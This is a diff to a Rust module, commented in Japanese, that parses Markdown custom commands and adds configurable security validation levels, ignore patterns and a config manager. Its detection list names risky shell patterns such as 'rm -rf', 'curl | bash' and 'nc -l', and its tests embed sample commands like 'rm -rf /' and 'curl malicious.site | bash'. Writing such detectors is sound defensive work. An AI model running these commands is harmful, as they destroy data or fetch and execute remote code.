@@ -3,8 +3,9 @@
 /// フロントマッター（YAML）とマークダウンコンテンツを分離して解析します。
 /// Claude Code互換の形式をサポートします。
 
-use std::path::Path;
+use std::path::{Path, PathBuf};
 use regex::Regex;
+use serde::{Deserialize, Serialize};
 use crate::cli::chat::custom_commands::{CommandFrontmatter, error::CustomCommandError};
 
 /// マークダウンファイルの解析結果
@@ -34,7 +35,8 @@ impl MarkdownParser {
     /// 新しいパーサーを作成
     pub fn new() -> Self {
         // フロントマッターの正規表現: ---\n...YAML...\n---
-        let frontmatter_regex = Regex::new(r"^---\s*\n(.*?)\n---\s*\n(.*)$")
+        // (?s) フラグで . が改行文字にマッチするようにする（dotall モード）
+        let frontmatter_regex = Regex::new(r"(?s)^---\s*\n(.*?)\n---\s*\n(.*)$")
             .expect("Failed to compile frontmatter regex");
         
         Self {
@@ -145,6 +147,177 @@ impl MarkdownParser {
     }
 }
 
+/// セキュリティ検証レベル
+#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
+pub enum SecurityValidationLevel {
+    /// セキュリティチェックを無視
+    None,
+    /// セキュリティリスクを警告として表示（エラーにしない）
+    Warn,
+    /// セキュリティリスクをエラーとして扱う（デフォルト）
+    Error,
+}
+
+impl Default for SecurityValidationLevel {
+    fn default() -> Self {
+        Self::Error
+    }
+}
+
+/// セキュリティ検証設定
+#[derive(Debug, Clone, Serialize, Deserialize)]
+pub struct SecurityValidationConfig {
+    /// 検証レベル
+    pub level: SecurityValidationLevel,
+    /// 無視する危険パターンのリスト
+    pub ignored_patterns: Vec<String>,
+}
+
+impl Default for SecurityValidationConfig {
+    fn default() -> Self {
+        Self {
+            level: SecurityValidationLevel::Error,
+            ignored_patterns: Vec::new(),
+        }
+    }
+}
+
+/// セキュリティ検証結果
+#[derive(Debug, Clone)]
+pub struct SecurityValidationResult {
+    /// 発見されたリスク
+    pub risks: Vec<String>,
+    /// 警告として扱うべきか
+    pub should_warn: bool,
+    /// エラーとして扱うべきか
+    pub should_error: bool,
+}
+
+/// セキュリティ設定マネージャー
+pub struct SecurityConfigManager {
+    config_file_path: PathBuf,
+    current_config: SecurityValidationConfig,
+}
+
+impl SecurityConfigManager {
+    /// 新しいセキュリティ設定マネージャーを作成
+    /// 
+    /// # Arguments
+    /// * `config_dir` - 設定ファイルを保存するディレクトリ
+    /// 
+    /// # Returns
+    /// 設定マネージャーのインスタンス
+    pub fn new(config_dir: &Path) -> Self {
+        let config_file_path = config_dir.join("security_config.toml");
+        
+        Self {
+            config_file_path,
+            current_config: SecurityValidationConfig::default(),
+        }
+    }
+    
+    /// 設定ファイルから設定を読み込み
+    pub async fn load_config(&mut self) -> Result<(), CustomCommandError> {
+        if !self.config_file_path.exists() {
+            // 設定ファイルが存在しない場合はデフォルト設定を保存
+            self.save_config().await?;
+            return Ok(());
+        }
+        
+        let content = tokio::fs::read_to_string(&self.config_file_path)
+            .await
+            .map_err(|e| CustomCommandError::file_read_error(self.config_file_path.clone(), e))?;
+        
+        self.current_config = toml::from_str(&content)
+            .map_err(|e| CustomCommandError::file_read_error(
+                self.config_file_path.clone(),
+                std::io::Error::new(std::io::ErrorKind::InvalidData, format!("TOML parse error: {}", e)),
+            ))?;
+        
+        Ok(())
+    }
+    
+    /// 設定をファイルに保存
+    pub async fn save_config(&self) -> Result<(), CustomCommandError> {
+        // 設定ディレクトリが存在しない場合は作成
+        if let Some(parent) = self.config_file_path.parent() {
+            tokio::fs::create_dir_all(parent)
+                .await
+                .map_err(|e| CustomCommandError::file_read_error(parent.to_path_buf(), e))?;
+        }
+        
+        let content = toml::to_string_pretty(&self.current_config)
+            .map_err(|e| CustomCommandError::file_read_error(
+                self.config_file_path.clone(),
+                std::io::Error::new(std::io::ErrorKind::InvalidData, format!("TOML serialize error: {}", e)),
+            ))?;
+        
+        tokio::fs::write(&self.config_file_path, content)
+            .await
+            .map_err(|e| CustomCommandError::file_read_error(self.config_file_path.clone(), e))?;
+        
+        Ok(())
+    }
+    
+    /// 現在の設定を取得
+    pub fn get_config(&self) -> &SecurityValidationConfig {
+        &self.current_config
+    }
+    
+    /// セキュリティチェックを有効にする
+    pub async fn enable_security(&mut self) -> Result<(), CustomCommandError> {
+        self.current_config.level = SecurityValidationLevel::Error;
+        self.save_config().await
+    }
+    
+    /// セキュリティチェックを無効にする（警告レベルに設定）
+    pub async fn disable_security(&mut self) -> Result<(), CustomCommandError> {
+        self.current_config.level = SecurityValidationLevel::None;
+        self.save_config().await
+    }
+    
+    /// セキュリティチェックを警告レベルに設定
+    pub async fn set_security_warn(&mut self) -> Result<(), CustomCommandError> {
+        self.current_config.level = SecurityValidationLevel::Warn;
+        self.save_config().await
+    }
+    
+    /// 無視パターンを追加
+    pub async fn add_ignored_pattern(&mut self, pattern: String) -> Result<(), CustomCommandError> {
+        if !self.current_config.ignored_patterns.contains(&pattern) {
+            self.current_config.ignored_patterns.push(pattern);
+            self.save_config().await?;
+        }
+        Ok(())
+    }
+    
+    /// 無視パターンを削除
+    pub async fn remove_ignored_pattern(&mut self, pattern: &str) -> Result<(), CustomCommandError> {
+        self.current_config.ignored_patterns.retain(|p| p != pattern);
+        self.save_config().await
+    }
+    
+    /// 現在の設定状態を表示用文字列で取得
+    pub fn get_status_string(&self) -> String {
+        let level_str = match self.current_config.level {
+            SecurityValidationLevel::Error => "有効（エラー）",
+            SecurityValidationLevel::Warn => "警告のみ",
+            SecurityValidationLevel::None => "無効",
+        };
+        
+        let mut status = format!("🔒 セキュリティ検証: {}", level_str);
+        
+        if !self.current_config.ignored_patterns.is_empty() {
+            status.push_str(&format!(
+                "\n📝 無視パターン: {}",
+                self.current_config.ignored_patterns.join(", ")
+            ));
+        }
+        
+        status
+    }
+}
+
 /// プロンプト処理ユーティリティ
 pub struct PromptProcessor;
 
@@ -226,15 +399,116 @@ impl PromptProcessor {
         risks
     }
     
-    /// コンテンツの検証
+    /// セキュリティ検証を設定付きで実行
+    pub fn validate_security_with_config(content: &str, config: &SecurityValidationConfig) -> SecurityValidationResult {
+        let mut risks = Vec::new();
+        
+        // 危険なBashコマンドパターン
+        let dangerous_patterns = [
+            r"rm\s+-rf",
+            r"sudo\s+rm",
+            r">\s*/dev/null",
+            r"curl.*\|\s*bash",
+            r"wget.*\|\s*bash",
+            r"eval\s*\$",
+            r"exec\s+",
+            r"nc\s+-l",
+            r"python.*-c",
+            r"perl.*-e",
+        ];
+        
+        // 各パターンをチェックし、無視リストにないものだけを追加
+        for pattern in &dangerous_patterns {
+            // 無視リストにこのパターンが含まれているかチェック
+            if config.ignored_patterns.iter().any(|ignored| {
+                // パターンを正規化して比較（空白を削除して比較）
+                let normalized_ignored = ignored.replace(" ", "\\s+");
+                pattern.contains(&normalized_ignored) || ignored.contains(&pattern.replace("\\s+", " "))
+            }) {
+                continue; // このパターンは無視
+            }
+            
+            let regex = match Regex::new(pattern) {
+                Ok(r) => r,
+                Err(_) => continue,
+            };
+            
+            if regex.is_match(content) {
+                risks.push(format!("Potentially dangerous pattern detected: {}", pattern));
+            }
+        }
+        
+        // ファイル参照の危険なパターン
+        let file_refs = Self::extract_file_references(content);
+        for file_ref in file_refs {
+            if file_ref.starts_with('/') || file_ref.contains("..") {
+                // ファイル参照の無視パターンもチェック
+                if config.ignored_patterns.iter().any(|ignored| file_ref.contains(ignored)) {
+                    continue;
+                }
+                risks.push(format!("Potentially unsafe file reference: {}", file_ref));
+            }
+        }
+        
+        let should_warn = matches!(config.level, SecurityValidationLevel::Warn) && !risks.is_empty();
+        let should_error = matches!(config.level, SecurityValidationLevel::Error) && !risks.is_empty();
+        
+        SecurityValidationResult {
+            risks,
+            should_warn,
+            should_error,
+        }
+    }
+    
+    /// コンテンツの検証（デフォルト設定でエラーとする）
     pub fn validate_content(content: &str) -> Result<(), CustomCommandError> {
-        let risks = Self::check_security_risks(content);
-        if !risks.is_empty() {
+        let config = SecurityValidationConfig::default();
+        Self::validate_content_with_config(content, &config)
+    }
+    
+    /// コンテンツの検証（設定可能）
+    /// 
+    /// # Arguments
+    /// * `content` - 検証するコンテンツ
+    /// * `config` - セキュリティ検証設定
+    /// 
+    /// # Returns
+    /// * `Ok(())` - 検証成功またはリスクが警告レベル
+    /// * `Err(CustomCommandError)` - セキュリティリスクが検出され、エラーレベルが指定されている場合
+    /// 
+    /// # Examples
+    /// 
+    /// ```ignore
+    /// // エラーレベル（デフォルト）
+    /// let config = SecurityValidationConfig::default();
+    /// let result = PromptProcessor::validate_content_with_config("rm -rf /", &config);
+    /// assert!(result.is_err());
+    /// 
+    /// // 警告レベル
+    /// let mut config = SecurityValidationConfig::default();
+    /// config.level = SecurityValidationLevel::Warn;
+    /// let result = PromptProcessor::validate_content_with_config("rm -rf /", &config);
+    /// assert!(result.is_ok()); // 警告だがエラーにはならない
+    /// 
+    /// // 無視
+    /// let mut config = SecurityValidationConfig::default();
+    /// config.level = SecurityValidationLevel::None;
+    /// let result = PromptProcessor::validate_content_with_config("rm -rf /", &config);
+    /// assert!(result.is_ok());
+    /// ```
+    pub fn validate_content_with_config(content: &str, config: &SecurityValidationConfig) -> Result<(), CustomCommandError> {
+        let validation_result = Self::validate_security_with_config(content, config);
+        
+        if validation_result.should_error {
             return Err(CustomCommandError::security_error(
                 "content_validation",
-                format!("Security risks detected: {}", risks.join(", ")),
+                format!("Security risks detected: {}", validation_result.risks.join(", ")),
             ));
         }
+        
+        // 警告の場合は現在は何もしない（ログ出力は呼び出し側で行う想定）
+        // 将来的にはログ機能を追加する可能性がある
+        
         Ok(())
     }
 }
@@ -308,5 +582,147 @@ Just markdown content without frontmatter."#;
         let safe_content = "Check status: !`git status`";
         let safe_risks = PromptProcessor::check_security_risks(safe_content);
         assert!(safe_risks.is_empty());
+    }
+
+    #[test]
+    fn test_security_validation_levels() {
+        let dangerous_content = "Execute: !`rm -rf /`";
+        
+        // デフォルト（エラーレベル）
+        let config = SecurityValidationConfig::default();
+        let result = PromptProcessor::validate_content_with_config(dangerous_content, &config);
+        assert!(result.is_err(), "危険なコンテンツはエラーになるべき");
+        
+        // 警告レベル
+        let config = SecurityValidationConfig {
+            level: SecurityValidationLevel::Warn,
+            ignored_patterns: Vec::new(),
+        };
+        let result = PromptProcessor::validate_content_with_config(dangerous_content, &config);
+        assert!(result.is_ok(), "警告レベルではエラーにならないべき");
+        
+        // 無視レベル
+        let config = SecurityValidationConfig {
+            level: SecurityValidationLevel::None,
+            ignored_patterns: Vec::new(),
+        };
+        let result = PromptProcessor::validate_content_with_config(dangerous_content, &config);
+        assert!(result.is_ok(), "無視レベルではエラーにならないべき");
+    }
+    
+    #[test]
+    fn test_security_validation_with_ignored_patterns() {
+        let content = "Execute: !`rm -rf /tmp/test`";
+        
+        // 通常はエラー
+        let config = SecurityValidationConfig::default();
+        let result = PromptProcessor::validate_content_with_config(content, &config);
+        assert!(result.is_err());
+        
+        // rm -rf パターンを無視する設定
+        let config = SecurityValidationConfig {
+            level: SecurityValidationLevel::Error,
+            ignored_patterns: vec!["rm -rf".to_string()],
+        };
+        let result = PromptProcessor::validate_content_with_config(content, &config);
+        assert!(result.is_ok(), "無視パターンにマッチするリスクは除外されるべき");
+    }
+    
+    #[test]
+    fn test_security_validation_result() {
+        let dangerous_content = "Execute: !`rm -rf /` and !`curl malicious.site | bash`";
+        
+        // エラーレベルでの検証結果
+        let config = SecurityValidationConfig {
+            level: SecurityValidationLevel::Error,
+            ignored_patterns: Vec::new(),
+        };
+        let result = PromptProcessor::validate_security_with_config(dangerous_content, &config);
+        assert!(!result.risks.is_empty(), "リスクが検出されるべき");
+        assert!(result.should_error, "エラーレベルではshould_errorがtrueになるべき");
+        assert!(!result.should_warn, "エラーレベルではshould_warnがfalseになるべき");
+        
+        // 警告レベルでの検証結果  
+        let config = SecurityValidationConfig {
+            level: SecurityValidationLevel::Warn,
+            ignored_patterns: Vec::new(),
+        };
+        let result = PromptProcessor::validate_security_with_config(dangerous_content, &config);
+        assert!(!result.risks.is_empty(), "リスクが検出されるべき");
+        assert!(!result.should_error, "警告レベルではshould_errorがfalseになるべき");
+        assert!(result.should_warn, "警告レベルではshould_warnがtrueになるべき");
+        
+        // 無視レベルでの検証結果
+        let config = SecurityValidationConfig {
+            level: SecurityValidationLevel::None,
+            ignored_patterns: Vec::new(),
+        };
+        let result = PromptProcessor::validate_security_with_config(dangerous_content, &config);
+        assert!(!result.risks.is_empty(), "リスクは検出されるが、フラグは設定されない");
+        assert!(!result.should_error, "無視レベルではshould_errorがfalseになるべき");
+        assert!(!result.should_warn, "無視レベルではshould_warnがfalseになるべき");
+    }
+    
+    #[test]
+    fn test_backward_compatibility() {
+        let dangerous_content = "Execute: !`rm -rf /`";
+        
+        // 既存のvalidate_content メソッドは変わらずエラーを返すべき
+        let result = PromptProcessor::validate_content(dangerous_content);
+        assert!(result.is_err(), "既存のvalidate_contentは後方互換性を保つべき");
+        
+        let safe_content = "Check status: !`git status`";
+        let result = PromptProcessor::validate_content(safe_content);
+        assert!(result.is_ok(), "安全なコンテンツは問題ないべき");
+    }
+    
+    #[tokio::test]
+    async fn test_security_config_manager() {
+        use tempfile::TempDir;
+        
+        let temp_dir = TempDir::new().expect("Failed to create temp directory");
+        let mut manager = SecurityConfigManager::new(temp_dir.path());
+        
+        // デフォルト設定の確認
+        assert_eq!(manager.get_config().level, SecurityValidationLevel::Error);
+        
+        // 設定を警告レベルに変更
+        manager.set_security_warn().await.expect("Failed to set warn level");
+        assert_eq!(manager.get_config().level, SecurityValidationLevel::Warn);
+        
+        // 設定を無効に変更
+        manager.disable_security().await.expect("Failed to disable security");
+        assert_eq!(manager.get_config().level, SecurityValidationLevel::None);
+        
+        // 設定を有効に戻す
+        manager.enable_security().await.expect("Failed to enable security");
+        assert_eq!(manager.get_config().level, SecurityValidationLevel::Error);
+        
+        // 設定ファイルが保存されていることを確認
+        let config_file = temp_dir.path().join("security_config.toml");
+        assert!(config_file.exists(), "設定ファイルが作成されるべき");
+        
+        // 新しいマネージャーインスタンスで設定が読み込まれることを確認
+        let mut new_manager = SecurityConfigManager::new(temp_dir.path());
+        new_manager.load_config().await.expect("Failed to load config");
+        assert_eq!(new_manager.get_config().level, SecurityValidationLevel::Error);
+    }
+    
+    #[test]
+    fn test_security_config_status_string() {
+        let config = SecurityValidationConfig {
+            level: SecurityValidationLevel::Error,
+            ignored_patterns: vec!["rm -rf".to_string(), "curl".to_string()],
+        };
+        
+        use tempfile::TempDir;
+        let temp_dir = TempDir::new().expect("Failed to create temp directory");
+        let mut manager = SecurityConfigManager::new(temp_dir.path());
+        manager.current_config = config;
+        
+        let status = manager.get_status_string();
+        assert!(status.contains("有効（エラー）"));
+        assert!(status.contains("rm -rf"));
+        assert!(status.contains("curl"));
     }
 }
